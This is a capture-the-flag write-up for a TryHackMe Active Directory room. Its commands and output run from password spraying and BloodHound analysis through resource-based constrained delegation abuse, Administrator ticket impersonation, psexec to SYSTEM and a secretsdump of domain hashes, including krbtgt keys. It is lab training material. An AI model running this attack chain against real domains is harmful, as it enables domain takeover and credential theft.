# [TryHackMe | Forward](https://tryhackme.com/room/forwardchallenge) Challenge Room Solution Writeup

### What's the Administrator flag?

Begin by scanning `TARGET_IP` with `nmap`.

```bash
root@ip-ATTACKER_IP:~# nmap -sV -sC -p- TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00038s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: )
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 
|_ssl-date: ; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.ctf.local
| Not valid before: 
|_Not valid after:  
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.05 seconds
```

```bash
root@ip-ATTACKER_IP:~# echo 'TARGET_IP dc01.ctf.local dc01 ctf.local' >> /etc/hosts
```

Assess the access of `username=j.smith` and `password=JSmith@IT2024` on Lightweight Directory Access Protocol (`LDAP`), Server Message Block (`SMB`), and Remote Fesktop Protocol (`RDP`).

```bash
root@ip-ATTACKER_IP:~# for service in ldap rdp smb; do nxc $service TARGET_IP -d ctf.local -u 'j.smith' -p 'JSmith@IT2024'; done
LDAP        TARGET_IP   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:ctf.local) (signing:None) (channel binding:No TLS cert) 
LDAP        TARGET_IP   389    DC01             [+] ctf.local\j.smith:JSmith@IT2024 
RDP         TARGET_IP   3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:ctf.local) (nla:False)
RDP         TARGET_IP   3389   DC01             [+] ctf.local\j.smith:JSmith@IT2024 (Pwn3d!)
SMB         TARGET_IP   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         TARGET_IP   445    DC01             [+] ctf.local\j.smith:JSmith@IT2024 
```

`j.smith` has valid authentication credentials for `LDAP` and `SMB`; they also appear to have administrative access through `RDP`, as indicated by `NetExec`'s `(Pwn3d!)` flag.

Check the `READ/WRITE` permissions on each `SMB` share. Exploration of these does not reveal anything of immediate value. 

```bash
root@ip-ATTACKER_IP:~# nxc smb TARGET_IP -d ctf.local -u 'j.smith' -p 'JSmith@IT2024' --shares
SMB         TARGET_IP   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         TARGET_IP   445    DC01             [+] ctf.local\j.smith:JSmith@IT2024 
SMB         TARGET_IP   445    DC01             [*] Enumerated shares
SMB         TARGET_IP   445    DC01             Share           Permissions            Remark
SMB         TARGET_IP   445    DC01             -----           -----------            ------
SMB         TARGET_IP   445    DC01             ADMIN$                                 Remote Admin
SMB         TARGET_IP   445    DC01             C$                                     Default share
SMB         TARGET_IP   445    DC01             Downloads       READ                   File drop share
SMB         TARGET_IP   445    DC01             IPC$            READ                   Remote IPC
SMB         TARGET_IP   445    DC01             NETLOGON        READ                   Logon server share 
SMB         TARGET_IP   445    DC01             SYSVOL          READ                   Logon server share 
```

Enumerate usernames from the `LDAP` which may potentially be used for pivoting later.

```bash
root@ip-ATTACKER_IP:~# ldapsearch -x -LLL -H ldap://TARGET_IP -b 'dc=ctf,dc=local' -D 'j.smith@ctf.local' -w 'JSmith@IT2024' '(&(objectCategory=person)(objectClass=user))' sAMAccountName | grep '^sAMAccountName:' | sed 's/^sAMAccountName: //' > usernames.txt
root@ip-ATTACKER_IP:~# cat usernames.txt 
Administrator
Guest
krbtgt
j.smith
t.jones
r.williams
svc.helpdesk
```

Connect via `RDP` to the Windows machine, then open `powershell.exe` and check privileges.

```bash
root@ip-ATTACKER_IP:~# xfreerdp /v:TARGET_IP /d:ctf.local /u:j.smith /p:'JSmith@IT2024' /dynamic-resolution

PS C:\Users\j.smith> whoami /all

USER INFORMATION
----------------

User Name   SID
=========== ============================================
ctf\j.smith S-1-5-21-1966530601-3185510712-10604624-1609


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes                                    
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Group used for deny only                      
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
CTF\AppLocker-Restricted                   Alias            S-1-5-21-1966530601-3185510712-10604624-1614 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Inspect the `Downloads` share information, which may be used for exfiltration. 

```bash
PS C:\Users\j.smith> Get-SmbShare -Name Downloads

Name      ScopeName Path         Description
----      --------- ----         -----------
Downloads *         C:\Downloads File drop share
```

Search for a `KeyPass` database and open it.

```bash
PS C:\Users\j.smith> Get-ChildItem -Path C:\Users\j.smith -Recurse -Filter *.kdbx -ErrorAction SilentlyContinue | Select-Object FullName

FullName
--------
C:\Users\j.smith\Documents\Database.kdbx
PS C:\Users\j.smith> Start-Process 'C:\Program Files\KeePass Password Safe 2\KeePass.exe' -ArgumentList 'C:\Users\j.smith\Documents\Database.kdbx'
```

Doing so discovers IT Help Desk ticketing system credentials of `username=t.jones` and `password=Helpdesk01!`. Enumerate the two known passwords, then perform a password spray attack on 

```bash
root@ip-ATTACKER_IP:~# printf '%s\n' 'JSmith@IT2024' 'Helpdesk01!' > passwords.txt
root@ip-ATTACKER_IP:~# cat passwords.txt 
JSmith@IT2024
Helpdesk01!
root@ip-ATTACKER_IP:~# for service in ldap rdp smb; do nxc $service TARGET_IP -d ctf.local -u usernames.txt -p passwords.txt --continue-on-success; done
LDAP        TARGET_IP    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:ctf.local) (signing:None) (channel binding:No TLS cert) 
LDAP        TARGET_IP    389    DC01             [-] ctf.local\Administrator:JSmith@IT2024 
LDAP        TARGET_IP    389    DC01             [-] ctf.local\Guest:JSmith@IT2024 
LDAP        TARGET_IP    389    DC01             [-] ctf.local\krbtgt:JSmith@IT2024 
LDAP        TARGET_IP    389    DC01             [+] ctf.local\j.smith:JSmith@IT2024 
LDAP        TARGET_IP    389    DC01             [-] ctf.local\t.jones:JSmith@IT2024 
LDAP        TARGET_IP    389    DC01             [-] ctf.local\r.williams:JSmith@IT2024 
LDAP        TARGET_IP    389    DC01             [-] ctf.local\svc.helpdesk:JSmith@IT2024 
LDAP        TARGET_IP    389    DC01             [-] ctf.local\Administrator:Helpdesk01! 
LDAP        TARGET_IP    389    DC01             [-] ctf.local\Guest:Helpdesk01! 
LDAP        TARGET_IP    389    DC01             [-] ctf.local\krbtgt:Helpdesk01! 
LDAP        TARGET_IP    389    DC01             [+] ctf.local\t.jones:Helpdesk01! 
LDAP        TARGET_IP    389    DC01             [+] ctf.local\r.williams:Helpdesk01! 
LDAP        TARGET_IP    389    DC01             [-] ctf.local\svc.helpdesk:Helpdesk01! 
RDP         TARGET_IP    3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:ctf.local) (nla:False)
RDP         TARGET_IP    3389   DC01             [-] ctf.local\Administrator:JSmith@IT2024 (STATUS_LOGON_FAILURE)
RDP         TARGET_IP    3389   DC01             [-] ctf.local\Guest:JSmith@IT2024 (STATUS_LOGON_FAILURE)
RDP         TARGET_IP    3389   DC01             [-] ctf.local\krbtgt:JSmith@IT2024 (STATUS_LOGON_FAILURE)
RDP         TARGET_IP    3389   DC01             [+] ctf.local\j.smith:JSmith@IT2024 (Pwn3d!)
RDP         TARGET_IP    3389   DC01             [-] ctf.local\t.jones:JSmith@IT2024 (STATUS_LOGON_FAILURE)
RDP         TARGET_IP    3389   DC01             [-] ctf.local\r.williams:JSmith@IT2024 (STATUS_LOGON_FAILURE)
RDP         TARGET_IP    3389   DC01             [-] ctf.local\svc.helpdesk:JSmith@IT2024 (STATUS_LOGON_FAILURE)
RDP         TARGET_IP    3389   DC01             [-] ctf.local\Administrator:Helpdesk01! (STATUS_LOGON_FAILURE)
RDP         TARGET_IP    3389   DC01             [-] ctf.local\Guest:Helpdesk01! (STATUS_LOGON_FAILURE)
RDP         TARGET_IP    3389   DC01             [-] ctf.local\krbtgt:Helpdesk01! (STATUS_LOGON_FAILURE)
RDP         TARGET_IP    3389   DC01             [+] ctf.local\t.jones:Helpdesk01! (Pwn3d!)
RDP         TARGET_IP    3389   DC01             [+] ctf.local\r.williams:Helpdesk01! (Pwn3d!)
RDP         TARGET_IP    3389   DC01             [-] ctf.local\svc.helpdesk:Helpdesk01! (STATUS_LOGON_FAILURE)
SMB         TARGET_IP    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         TARGET_IP    445    DC01             [-] ctf.local\Administrator:JSmith@IT2024 STATUS_LOGON_FAILURE 
SMB         TARGET_IP    445    DC01             [-] ctf.local\Guest:JSmith@IT2024 STATUS_LOGON_FAILURE 
SMB         TARGET_IP    445    DC01             [-] ctf.local\krbtgt:JSmith@IT2024 STATUS_LOGON_FAILURE 
SMB         TARGET_IP    445    DC01             [+] ctf.local\j.smith:JSmith@IT2024 
SMB         TARGET_IP    445    DC01             [-] ctf.local\t.jones:JSmith@IT2024 STATUS_LOGON_FAILURE 
SMB         TARGET_IP    445    DC01             [-] ctf.local\r.williams:JSmith@IT2024 STATUS_LOGON_FAILURE 
SMB         TARGET_IP    445    DC01             [-] ctf.local\svc.helpdesk:JSmith@IT2024 STATUS_LOGON_FAILURE 
SMB         TARGET_IP    445    DC01             [-] ctf.local\Administrator:Helpdesk01! STATUS_LOGON_FAILURE 
SMB         TARGET_IP    445    DC01             [-] ctf.local\Guest:Helpdesk01! STATUS_LOGON_FAILURE 
SMB         TARGET_IP    445    DC01             [-] ctf.local\krbtgt:Helpdesk01! STATUS_LOGON_FAILURE 
SMB         TARGET_IP    445    DC01             [+] ctf.local\t.jones:Helpdesk01! 
SMB         TARGET_IP    445    DC01             [+] ctf.local\r.williams:Helpdesk01! 
SMB         TARGET_IP    445    DC01             [-] ctf.local\svc.helpdesk:Helpdesk01! STATUS_LOGON_FAILURE 
```

`r.williams` shares a password with `t.jones`, revealing a new attack vector. `t.jones` and `r.williams` have valid authentication credentials for `LDAP` and `SMB`; they also appear to have administrative access through `RDP`, as indicated by `NetExec`'s `(Pwn3d!)` flag. 

Connect via `RDP` to the Windows machine, then open `powershell.exe` and check privileges for `t.jones`.

```bash
root@ip-ATTACKER_IP:~# xfreerdp /v:TARGET_IP /d:ctf.local /u:t.jones /p:'Helpdesk01!' /dynamic-resolution

PS C:\Users\t.jones> whoami /all

USER INFORMATION
----------------

User Name   SID
=========== ============================================
ctf\t.jones S-1-5-21-1966530601-3185510712-10604624-1610


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes                                    
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Group used for deny only                      
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
CTF\AppLocker-Restricted                   Alias            S-1-5-21-1966530601-3185510712-10604624-1614 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Connect via `RDP` to the Windows machine, then open `powershell.exe` and check privileges for `r.williams`.

```bash
root@ip-ATTACKER_IP:~# xfreerdp /v:TARGET_IP /d:ctf.local /u:r.williams /p:'Helpdesk01!' /dynamic-resolution

PS C:\Users\r.williams.CTF> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
ctf\r.williams S-1-5-21-1966530601-3185510712-10604624-1611


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes                                    
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Group used for deny only                      
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
CTF\sysadmin                               Alias            S-1-5-21-1966530601-3185510712-10604624-1613 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

For the three users so far, the privilege information is tabulated together below, although there are no differences.

```bash
User Name      Privilege Name                Description                    State
============== ============================= ============================== ========
ctf\j.smith    SeMachineAccountPrivilege     Add workstations to domain     Disabled
               SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
               SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

ctf\t.jones    SeMachineAccountPrivilege     Add workstations to domain     Disabled
               SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
               SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

ctf\r.williams SeMachineAccountPrivilege     Add workstations to domain     Disabled
               SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
               SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

`j.smith` and `t.jones` however are part of the `CTF\AppLocker-Restricted` group wheras `r.williams` is part of `CTF\sysadmin`. Therefore `r.williams` is the most likely path *forward*.

Use `BloodHound` to discover additional information and relationships for `r.williams`.

```bash
root@ip-ATTACKER_IP:~# bloodhound-python -ns TARGET_IP -d ctf.local -dc dc01.ctf.local -u 'r.williams' -p 'Helpdesk01!' -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: ctf.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 8 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.ctf.local
INFO: Done in 00M 02S
INFO: Compressing output into 20261103170320_bloodhound.zip
```

> [!WARNING]
> If you run into this dependency version mismatch error shown below in a TryHackMe AttackBox, you can fix by upgrading upgrade `dnspython` with `/usr/local/pyenv/versions/3.8.20/bin/python -m pip install --upgrade dnspython`.
>```bash
>root@ip-ATTACKER_IP:~# bloodhound-python -ns TARGET_IP -d ctf.local -dc DC01.ctf.local -u 'r.williams' -p 'Helpdesk01!' -c All --zip
> INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
> INFO: Found AD domain: ctf.local
> INFO: Getting TGT for user
> INFO: Connecting to LDAP server: DC01.ctf.local
> ERROR: Failed to resolve LDAP server IP
> Traceback (most recent call last):
>   File "/usr/local/pyenv/versions/3.8.20/bin/bloodhound-python", line 8, in <module>
>     sys.exit(main())
>   File "/usr/local/pyenv/versions/3.8.20/lib/python3.8/site-packages/bloodhound/__init__.py", line 347, in main
>     bloodhound.run(collect=collect,
>   File "/usr/local/pyenv/versions/3.8.20/lib/python3.8/site-packages/bloodhound/__init__.py", line 78, in run
>     self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect, cache_computers=do_computer_enum)
>   File "/usr/local/pyenv/versions/3.8.20/lib/python3.8/site-packages/bloodhound/ad/domain.py", line 620, in prefetch_info
>     self.get_objecttype()
>   File "/usr/local/pyenv/versions/3.8.20/lib/python3.8/site-packages/bloodhound/ad/domain.py", line 305, in get_objecttype
>     sresult = self.ldap.extend.standard.paged_search(self.ldap.server.info.other['schemaNamingContext'][0],
> AttributeError: 'NoneType' object has no attribute 'extend'
> ```

Analysis of this data in `BloodHound` reveals that `r.williams` possesses an edge for `AddAllowedToAct` against `DC01$`. This means that `r.williams` has the permission to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the `DC01$` computer object, allowing them to configure Resource-Based Constrained Delegation (`RBCD`) and designate another principal to impersonate users to services running under the computer account's identity. 

Because `r.williams` controls no computer accounts, one must first be created.

```bash
root@ip-ATTACKER_IP:~# addcomputer -computer-name 'ATTACKER$' -computer-pass 'Helpdesk01!' -dc-ip TARGET_IP 'ctf.local/r.williams:Helpdesk01!'
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACKER$ with password Helpdesk01!.
```

Now configure `RBCD` on the newly created computer account to facilitate impersonation on `DC01$`.

```bash
root@ip-ATTACKER_IP:~# rbcd -delegate-from 'ATTACKER$' -delegate-to 'DC01$' -action write -dc-ip TARGET_IP 'ctf.local/r.williams:Helpdesk01!'
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKER$ can now impersonate users on DC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKER$    (S-1-5-21-1966530601-3185510712-10604624-3109)
```

Request a ticket for the `CIFS` service on `DC01` while impersonating the `Administrator`, then export it.

```bash
root@ip-ATTACKER_IP:~# getST -spn 'cifs/DC01.ctf.local' -impersonate Administrator -dc-ip TARGET_IP 'ctf.local/ATTACKER$:Helpdesk01!'
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
root@ip-ATTACKER_IP:~# export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

Use this forged ticket with `psexec` and `Kerberos` to gain `nt authority\system` access.

```bash
root@ip-ATTACKER_IP:~# psexec -k -no-pass dc01.ctf.local
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc01.ctf.local.....
[*] Found writable share ADMIN$
[*] Uploading file hlQedcwU.exe
[*] Opening SVCManager on dc01.ctf.local.....
[*] Creating service pYOO on dc01.ctf.local.....
[*] Starting service pYOO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/20/2026  03:21 PM    <DIR>          .
05/20/2026  03:21 PM    <DIR>          ..
05/20/2026  05:52 PM                37 flag.txt
               1 File(s)             37 bytes
               2 Dir(s)  14,686,781,440 bytes free

C:\Users\Administrator\Desktop> type flag.txt
THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
```

The flag is recovered as **THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}**.

For further post-exploitation, use the forged ticket with `secretsdump` to collect all domain account hashes. That of `krbtgt` can even be used to forge a golden ticket!

```bash
root@ip-ATTACKER_IP:~# secretsdump -k -no-pass dc01.ctf.local
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CTF\DC01$:aes256-cts-hmac-sha1-96:545a5961b6f03497646c5a0eb71bf23b9d184f905e8ff3443a328d729a674a92
CTF\DC01$:aes128-cts-hmac-sha1-96:84994d5c01ecdccb527613673bfd0df1
CTF\DC01$:des-cbc-md5:f191dcab4aba57e9
CTF\DC01$:plain_password_hex:d9fa56ff94ec9955edc36606c0c4807ff4e4e2e2e4f937ced171de35373d2c405f392b8d837d6072080796bae6f8283446438760025cdac35bc9cc9a7d1dca4cf9cf42831da7d78a2d447f3ab36af6fa7697494ab63025963680682755403ce75551457f4e529f2380652abbf24dbff8f568402a357e0f42f1a856f532a6bc0e14c3a684a303997132f57c92f59972ecb5b203fd7a002fc014080b03fa9ccc7e4b9ee1c8cf5381ec4478df65adc8b3f8a32e0abeefb8c56c6018326324c96afd164246445a7fac726288be374209c34fc7a01df10e4c31c3e575a242f5cfa4c4cbd46de0a554ba619cbb7651e5c0a857
CTF\DC01$:aad3b435b51404eeaad3b435b51404ee:ecde91cb0a54669c392df0fd6be35e8a:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0e88ce11d311d3966ca2422ac2708a4d707e00be
dpapi_userkey:0x8b68be9ef724e59070e7e3559e10078e36e8ab32
[*] NL$KM 
 0000   8D D2 8E 67 54 58 89 B1  C9 53 B9 5B 46 A2 B3 66   ...gTX...S.[F..f
 0010   D4 3B 95 80 92 7D 67 78  B7 1D F9 2D A5 55 B7 A3   .;...}gx...-.U..
 0020   61 AA 4D 86 95 85 43 86  E3 12 9E C4 91 CF 9A 5B   a.M...C........[
 0030   D8 BB 0D AE FA D3 41 E0  D8 66 3D 19 75 A2 D1 B2   ......A..f=.u...
NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:30a466d566f3ac85b0d1e386b07b77b8:::
ctf.local\j.smith:1609:aad3b435b51404eeaad3b435b51404ee:c2d4afb8b5dc6e6d5b5f0798ba3cfd49:::
ctf.local\t.jones:1610:aad3b435b51404eeaad3b435b51404ee:b1ef0849ba3f56c69df890308796fec9:::
ctf.local\r.williams:1611:aad3b435b51404eeaad3b435b51404ee:b1ef0849ba3f56c69df890308796fec9:::
ctf.local\svc.helpdesk:1612:aad3b435b51404eeaad3b435b51404ee:7cae25b94a08c713369530d51fd15a05:::
DC01$:1008:aad3b435b51404eeaad3b435b51404ee:ecde91cb0a54669c392df0fd6be35e8a:::
ATTACKER$:3109:aad3b435b51404eeaad3b435b51404ee:b1ef0849ba3f56c69df890308796fec9:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:676d30e0b5901bba6856e4bb1bfff09c8d17cbf64f82068e41ecf2626576c36e
Administrator:aes128-cts-hmac-sha1-96:de0e54e480e3ca04898505961e6dc826
Administrator:des-cbc-md5:a483ab2abcf8dc40
krbtgt:aes256-cts-hmac-sha1-96:7af3a8fbb31cd7083fb7a8c48a98b791f470040ed0ad16bfcb2a466c77a831c1
krbtgt:aes128-cts-hmac-sha1-96:df089d0fbbfc62cb983976aa0a107830
krbtgt:des-cbc-md5:c7a4e32cd0f84ab3
ctf.local\j.smith:aes256-cts-hmac-sha1-96:1f5cd9354485c69e29e31df6b15ee76f9a31ace9f616212e578eed4652d77f67
ctf.local\j.smith:aes128-cts-hmac-sha1-96:d18f42ba27b99cba530da945d895b574
ctf.local\j.smith:des-cbc-md5:7546c425f8cb5b75
ctf.local\t.jones:aes256-cts-hmac-sha1-96:207da89b08cc267a2cdf9f485f483a77fcabe242396b95214f738ce9aa98a6a2
ctf.local\t.jones:aes128-cts-hmac-sha1-96:414d463c523677cbbdc3fa632e6c5e8a
ctf.local\t.jones:des-cbc-md5:642949bf016d07c1
ctf.local\r.williams:aes256-cts-hmac-sha1-96:3b0f03d8f7af08e86cd00d11d6ee9698e81227b557dc1b159751d1c501eae0d4
ctf.local\r.williams:aes128-cts-hmac-sha1-96:e3dd27611ba976514b95e4b47b6148d2
ctf.local\r.williams:des-cbc-md5:e5ec2345d6c2fefd
ctf.local\svc.helpdesk:aes256-cts-hmac-sha1-96:832290cdb216e339da724da206f2e24bec7db9d1f1d072d570098e2ff45fa518
ctf.local\svc.helpdesk:aes128-cts-hmac-sha1-96:c250ce78b42ab8de63c8828e5eb4f94b
ctf.local\svc.helpdesk:des-cbc-md5:fd348f08134f1cfd
